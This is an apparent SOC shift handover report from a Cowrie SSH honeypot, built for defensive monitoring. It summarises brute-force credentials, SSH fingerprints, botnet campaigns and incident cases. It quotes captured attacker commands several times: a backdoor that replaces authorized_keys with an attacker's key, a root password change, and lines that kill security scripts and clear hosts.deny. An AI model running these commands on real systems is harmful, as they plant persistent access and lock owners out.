# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-27 |
| **Generated At** | 2026-04-27T17:26:52Z |
| **Shift Time** | 17:26 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **167** |
| Confirmed Threats | **88** |
| False Positives Filtered | **79** (47.3%) |
| Unique Attacker IPs | **42** |
| Countries of Origin | **13** |
| High Severity Cases | **22** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **145** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **37** |
| Unique Credential Pairs | **20** |
| Unique Usernames | **5** |
| Unique Passwords | **19** |
| Successful Auth Pairs | **22** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 23 |
| `345gs5662d34` | 9 |
| `GET / HTTP/1.0` | 2 |
| `OPTIONS / HTTP/1.0` | 2 |
| `telnetadmin` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 9 |
| `3245gs5662d34` | 8 |
| `` | 4 |
| `elong2026` | 1 |
| `1qaz2wsxEDC` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 9 |
| `root` | `3245gs5662d34` | 8 |
| `GET / HTTP/1.0` | `` | 2 |
| `OPTIONS / HTTP/1.0` | `` | 2 |
| `root` | `elong2026` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `elong2026` | `172.206.32.4` | 2026-04-27T14:03:48 |
| `root` | `3245gs5662d34` | `172.206.32.4` | 2026-04-27T14:03:54 |
| `root` | `1qaz2wsxEDC` | `124.228.34.69` | 2026-04-27T14:06:11 |
| `root` | `openauditrootuserpassword` | `103.117.56.120` | 2026-04-27T14:32:44 |
| `root` | `3245gs5662d34` | `103.117.56.120` | 2026-04-27T14:32:49 |
| `root` | `dm123456` | `14.63.196.175` | 2026-04-27T15:10:06 |
| `root` | `3245gs5662d34` | `14.63.196.175` | 2026-04-27T15:10:10 |
| `root` | `imp@1234` | `83.235.21.125` | 2026-04-27T15:23:34 |
| `root` | `3245gs5662d34` | `83.235.21.125` | 2026-04-27T15:23:39 |
| `root` | `admin123456!` | `211.213.96.6` | 2026-04-27T15:37:29 |
| `root` | `3245gs5662d34` | `211.213.96.6` | 2026-04-27T15:37:34 |
| `root` | `159753`!@#$` | `37.143.61.165` | 2026-04-27T15:52:59 |
| `root` | `3245gs5662d34` | `37.143.61.165` | 2026-04-27T15:53:02 |
| `root` | `admin` | `116.237.117.234` | 2026-04-27T16:08:09 |
| `root` | `qwe2025` | `165.154.6.138` | 2026-04-27T16:16:50 |
| `root` | `3245gs5662d34` | `165.154.6.138` | 2026-04-27T16:16:53 |
| `root` | `cvdfer34bgt5` | `114.217.10.60` | 2026-04-27T16:30:25 |
| `root` | `opendoor@2026` | `101.96.199.69` | 2026-04-27T16:33:15 |
| `root` | `cache@1234` | `43.160.244.79` | 2026-04-27T16:33:25 |
| `root` | `3245gs5662d34` | `43.160.244.79` | 2026-04-27T16:33:29 |
| `root` | `1234a` | `106.75.88.44` | 2026-04-27T16:36:10 |
| `root` | `a258` | `45.17.39.120` | 2026-04-27T17:24:37 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **167** |
| Sessions with Fingerprint | **6** |
| Unique HASSH Fingerprints | **6** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 62 |
| Unknown | 5 |
| Go SSH scanner | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `03a80b21afa8...` | Modern SSH client | 41 | 10 |
| `af8223ac9914...` | libssh-based | 21 | 9 |
| `98f63c4d9c87...` | Generic scanner | 1 | 1 |
| `e54ef3ec27fe...` | Generic scanner | 1 | 1 |
| `dd9bcf093c35...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `03a80b21afa8...` | libssh | 41 | 10 | Modern SSH client |
| `af8223ac9914...` | libssh | 21 | 9 | libssh-based |
| `95420f9d932d...` | Unknown | 4 | 2 | — |
| `98f63c4d9c87...` | Go SSH scanner | 1 | 1 | Generic scanner |
| `e54ef3ec27fe...` | Go SSH scanner | 1 | 1 | Generic scanner |
| `dd9bcf093c35...` | Unknown | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **4** |
| Campaign Clusters | **3** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 4 | 4 | `T1021.004, T1078, T1083, T1082` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1078, T1083, T1105, T1059.004` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 8 | 8 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:jycozwAryCfU"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `124.228.34.69`, `106.75.88.44`, `101.96.199.69`, `114.217.10.60`

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
start
```
```
enable
```
```
config terminal
```
```
system
```
```
linuxshell
```
Source IPs: `116.237.117.234`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `103.117.56.120`, `43.160.244.79`, `211.213.96.6`, `172.206.32.4`, `165.154.6.138`, `83.235.21.125`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **42** |
| Unique ASNs | **34** |
| High-Risk ASNs | **21** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4134` | CHINANET BACKBONE | 4 | HIGH |
| `AS8075` | Microsoft Corporation | 3 | HIGH |
| `AS23724` | IDC, China Telecommunications Corporation | 2 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 2 | HIGH |
| `AS396982` | Google LLC | 2 | LOW |
| `AS42831` | UK Dedicated Servers Limited | 1 | HIGH |
| `AS17488` | Hathway IP Over Cable Internet | 1 | LOW |
| `AS132203` | Tencent Building, Kejizhongyi Avenue | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (21)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-9fed320356a3

| Field | Detail |
|---|---|
| **Source IP** | `172.206.32[.]4` |
| **First Seen** | 2026-04-27 14:03 |
| **Last Seen** | 2026-04-27 14:03 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-27 14:03:47` | `cowrie.session.connect` |
| `2026-04-27 14:03:47` | `cowrie.client.version` |
| `2026-04-27 14:03:48` | `cowrie.client.kex` |
| `2026-04-27 14:03:48` | `cowrie.login.success` |
| `2026-04-27 14:03:49` | `cowrie.session.params` |
| `2026-04-27 14:03:49` | `cowrie.command.input` |
| `2026-04-27 14:03:49` | `cowrie.command.failed` |
| `2026-04-27 14:03:49` | `cowrie.log.closed` |
| `2026-04-27 14:03:50` | `cowrie.session.params` |
| `2026-04-27 14:03:50` | `cowrie.command.input` |
| `2026-04-27 14:03:50` | `cowrie.session.file_download` |
| `2026-04-27 14:03:50` | `cowrie.log.closed` |
| `2026-04-27 14:03:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.206.32[.]4` to AbuseIPDB if not already reported
- [ ] Block `172.206.32[.]4` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3676847130d1

| Field | Detail |
|---|---|
| **Source IP** | `172.206.32[.]4` |
| **First Seen** | 2026-04-27 14:03 |
| **Last Seen** | 2026-04-27 14:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-27 14:03:53` | `cowrie.session.connect` |
| `2026-04-27 14:03:53` | `cowrie.client.version` |
| `2026-04-27 14:03:53` | `cowrie.client.kex` |
| `2026-04-27 14:03:54` | `cowrie.login.success` |
| `2026-04-27 14:03:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.206.32[.]4` to AbuseIPDB if not already reported
- [ ] Block `172.206.32[.]4` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0d0dd2cc51c2

| Field | Detail |
|---|---|
| **Source IP** | `124.228.34[.]69` |
| **First Seen** | 2026-04-27 14:06 |
| **Last Seen** | 2026-04-27 14:06 |
| **Session Duration** | 21s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:jycozwAryCfU"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-27 14:06:10` | `cowrie.session.connect` |
| `2026-04-27 14:06:10` | `cowrie.client.version` |
| `2026-04-27 14:06:10` | `cowrie.client.kex` |
| `2026-04-27 14:06:11` | `cowrie.login.success` |
| `2026-04-27 14:06:11` | `cowrie.session.params` |
| `2026-04-27 14:06:11` | `cowrie.command.input` |
| `2026-04-27 14:06:11` | `cowrie.command.failed` |
| `2026-04-27 14:06:11` | `cowrie.log.closed` |
| `2026-04-27 14:06:12` | `cowrie.session.params` |
| `2026-04-27 14:06:12` | `cowrie.command.input` |
| `2026-04-27 14:06:12` | `cowrie.session.file_download` |
| `2026-04-27 14:06:12` | `cowrie.log.closed` |
| `2026-04-27 14:06:22` | `cowrie.session.params` |
| `2026-04-27 14:06:22` | `cowrie.command.input` |
| `2026-04-27 14:06:22` | `cowrie.log.closed` |
| `2026-04-27 14:06:23` | `cowrie.session.params` |
| `2026-04-27 14:06:23` | `cowrie.command.input` |
| `2026-04-27 14:06:23` | `cowrie.log.closed` |
| `2026-04-27 14:06:23` | `cowrie.session.params` |
| `2026-04-27 14:06:23` | `cowrie.command.input` |
| `2026-04-27 14:06:23` | `cowrie.session.file_download` |
| `2026-04-27 14:06:23` | `cowrie.log.closed` |
| `2026-04-27 14:06:24` | `cowrie.session.params` |
| `2026-04-27 14:06:24` | `cowrie.command.input` |
| `2026-04-27 14:06:24` | `cowrie.log.closed` |
| `2026-04-27 14:06:24` | `cowrie.session.params` |
| `2026-04-27 14:06:24` | `cowrie.command.input` |
| `2026-04-27 14:06:25` | `cowrie.log.closed` |
| `2026-04-27 14:06:25` | `cowrie.session.params` |
| `2026-04-27 14:06:25` | `cowrie.command.input` |
| `2026-04-27 14:06:25` | `cowrie.command.input` |
| `2026-04-27 14:06:25` | `cowrie.log.closed` |
| `2026-04-27 14:06:26` | `cowrie.session.params` |
| `2026-04-27 14:06:26` | `cowrie.command.input` |
| `2026-04-27 14:06:26` | `cowrie.log.closed` |
| `2026-04-27 14:06:26` | `cowrie.session.params` |
| `2026-04-27 14:06:26` | `cowrie.command.input` |
| `2026-04-27 14:06:26` | `cowrie.log.closed` |
| `2026-04-27 14:06:27` | `cowrie.session.params` |
| `2026-04-27 14:06:27` | `cowrie.command.input` |
| `2026-04-27 14:06:27` | `cowrie.log.closed` |
| `2026-04-27 14:06:27` | `cowrie.session.params` |
| `2026-04-27 14:06:27` | `cowrie.command.input` |
| `2026-04-27 14:06:27` | `cowrie.log.closed` |
| `2026-04-27 14:06:28` | `cowrie.session.params` |
| `2026-04-27 14:06:28` | `cowrie.command.input` |
| `2026-04-27 14:06:28` | `cowrie.log.closed` |
| `2026-04-27 14:06:28` | `cowrie.session.params` |
| `2026-04-27 14:06:28` | `cowrie.command.input` |
| `2026-04-27 14:06:29` | `cowrie.log.closed` |
| `2026-04-27 14:06:29` | `cowrie.session.params` |
| `2026-04-27 14:06:29` | `cowrie.command.input` |
| `2026-04-27 14:06:29` | `cowrie.log.closed` |
| `2026-04-27 14:06:30` | `cowrie.session.params` |
| `2026-04-27 14:06:30` | `cowrie.command.input` |
| `2026-04-27 14:06:30` | `cowrie.log.closed` |
| `2026-04-27 14:06:30` | `cowrie.session.params` |
| `2026-04-27 14:06:30` | `cowrie.command.input` |
| `2026-04-27 14:06:30` | `cowrie.log.closed` |
| `2026-04-27 14:06:31` | `cowrie.session.params` |
| `2026-04-27 14:06:31` | `cowrie.command.input` |
| `2026-04-27 14:06:31` | `cowrie.log.closed` |
| `2026-04-27 14:06:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.228.34[.]69` to AbuseIPDB if not already reported
- [ ] Block `124.228.34[.]69` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d0fbe0112742

| Field | Detail |
|---|---|
| **Source IP** | `103.117.56[.]120` |
| **First Seen** | 2026-04-27 14:32 |
| **Last Seen** | 2026-04-27 14:32 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-27 14:32:43` | `cowrie.session.connect` |
| `2026-04-27 14:32:43` | `cowrie.client.version` |
| `2026-04-27 14:32:43` | `cowrie.client.kex` |
| `2026-04-27 14:32:44` | `cowrie.login.success` |
| `2026-04-27 14:32:44` | `cowrie.session.params` |
| `2026-04-27 14:32:44` | `cowrie.command.input` |
| `2026-04-27 14:32:44` | `cowrie.command.failed` |
| `2026-04-27 14:32:44` | `cowrie.log.closed` |
| `2026-04-27 14:32:44` | `cowrie.session.params` |
| `2026-04-27 14:32:44` | `cowrie.command.input` |
| `2026-04-27 14:32:45` | `cowrie.session.file_download` |
| `2026-04-27 14:32:45` | `cowrie.log.closed` |
| `2026-04-27 14:32:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.117.56[.]120` to AbuseIPDB if not already reported
- [ ] Block `103.117.56[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2d93bd1c50ea

| Field | Detail |
|---|---|
| **Source IP** | `103.117.56[.]120` |
| **First Seen** | 2026-04-27 14:32 |
| **Last Seen** | 2026-04-27 14:32 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-27 14:32:47` | `cowrie.session.connect` |
| `2026-04-27 14:32:47` | `cowrie.client.version` |
| `2026-04-27 14:32:47` | `cowrie.client.kex` |
| `2026-04-27 14:32:49` | `cowrie.login.success` |
| `2026-04-27 14:32:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.117.56[.]120` to AbuseIPDB if not already reported
- [ ] Block `103.117.56[.]120` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a8de33a28964

| Field | Detail |
|---|---|
| **Source IP** | `14.63.196[.]175` |
| **First Seen** | 2026-04-27 15:10 |
| **Last Seen** | 2026-04-27 15:10 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-27 15:10:05` | `cowrie.session.connect` |
| `2026-04-27 15:10:05` | `cowrie.client.version` |
| `2026-04-27 15:10:06` | `cowrie.client.kex` |
| `2026-04-27 15:10:06` | `cowrie.login.success` |
| `2026-04-27 15:10:06` | `cowrie.session.params` |
| `2026-04-27 15:10:06` | `cowrie.command.input` |
| `2026-04-27 15:10:06` | `cowrie.command.failed` |
| `2026-04-27 15:10:07` | `cowrie.log.closed` |
| `2026-04-27 15:10:07` | `cowrie.session.params` |
| `2026-04-27 15:10:07` | `cowrie.command.input` |
| `2026-04-27 15:10:07` | `cowrie.session.file_download` |
| `2026-04-27 15:10:07` | `cowrie.log.closed` |
| `2026-04-27 15:10:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.63.196[.]175` to AbuseIPDB if not already reported
- [ ] Block `14.63.196[.]175` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e8e9cc384439

| Field | Detail |
|---|---|
| **Source IP** | `14.63.196[.]175` |
| **First Seen** | 2026-04-27 15:10 |
| **Last Seen** | 2026-04-27 15:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-27 15:10:09` | `cowrie.session.connect` |
| `2026-04-27 15:10:09` | `cowrie.client.version` |
| `2026-04-27 15:10:10` | `cowrie.client.kex` |
| `2026-04-27 15:10:10` | `cowrie.login.success` |
| `2026-04-27 15:10:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.63.196[.]175` to AbuseIPDB if not already reported
- [ ] Block `14.63.196[.]175` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f4112ac73bec

| Field | Detail |
|---|---|
| **Source IP** | `83.235.21[.]125` |
| **First Seen** | 2026-04-27 15:23 |
| **Last Seen** | 2026-04-27 15:23 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-27 15:23:33` | `cowrie.session.connect` |
| `2026-04-27 15:23:33` | `cowrie.client.version` |
| `2026-04-27 15:23:33` | `cowrie.client.kex` |
| `2026-04-27 15:23:34` | `cowrie.login.success` |
| `2026-04-27 15:23:34` | `cowrie.session.params` |
| `2026-04-27 15:23:34` | `cowrie.command.input` |
| `2026-04-27 15:23:34` | `cowrie.command.failed` |
| `2026-04-27 15:23:35` | `cowrie.log.closed` |
| `2026-04-27 15:23:35` | `cowrie.session.params` |
| `2026-04-27 15:23:35` | `cowrie.command.input` |
| `2026-04-27 15:23:35` | `cowrie.session.file_download` |
| `2026-04-27 15:23:35` | `cowrie.log.closed` |
| `2026-04-27 15:23:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `83.235.21[.]125` to AbuseIPDB if not already reported
- [ ] Block `83.235.21[.]125` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-85aced7e12f5

| Field | Detail |
|---|---|
| **Source IP** | `83.235.21[.]125` |
| **First Seen** | 2026-04-27 15:23 |
| **Last Seen** | 2026-04-27 15:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-27 15:23:38` | `cowrie.session.connect` |
| `2026-04-27 15:23:38` | `cowrie.client.version` |
| `2026-04-27 15:23:38` | `cowrie.client.kex` |
| `2026-04-27 15:23:39` | `cowrie.login.success` |
| `2026-04-27 15:23:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `83.235.21[.]125` to AbuseIPDB if not already reported
- [ ] Block `83.235.21[.]125` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5716280be31f

| Field | Detail |
|---|---|
| **Source IP** | `211.213.96[.]6` |
| **First Seen** | 2026-04-27 15:37 |
| **Last Seen** | 2026-04-27 15:37 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
